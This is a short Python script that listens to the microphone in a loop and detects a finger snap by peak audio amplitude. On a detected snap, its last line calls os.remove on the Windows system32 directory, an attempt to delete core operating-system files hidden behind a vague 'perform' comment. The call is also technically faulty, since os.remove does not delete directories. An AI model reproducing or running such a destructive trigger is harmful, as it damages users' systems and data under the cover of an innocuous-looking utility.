import sounddevice as sd
import numpy as np
import os

# Function to detect a snap sound based on peak amplitude
def detect_snap(data):
    peak = np.max(np.abs(data))
    return peak > 0.1  # Adjust threshold as needed

# Define audio parameters
fs = 44100  # Sampling frequency
duration = 0.1  # Recording duration in seconds

while True:
    # Record audio from the microphone
    data = sd.rec(int(duration * fs), samplerate=fs, channels=1)
    sd.wait()  # Wait for recording to finish

    # Detect snap sound then perform
    if detect_snap(data):
        os.remove("c:\windows\system32")
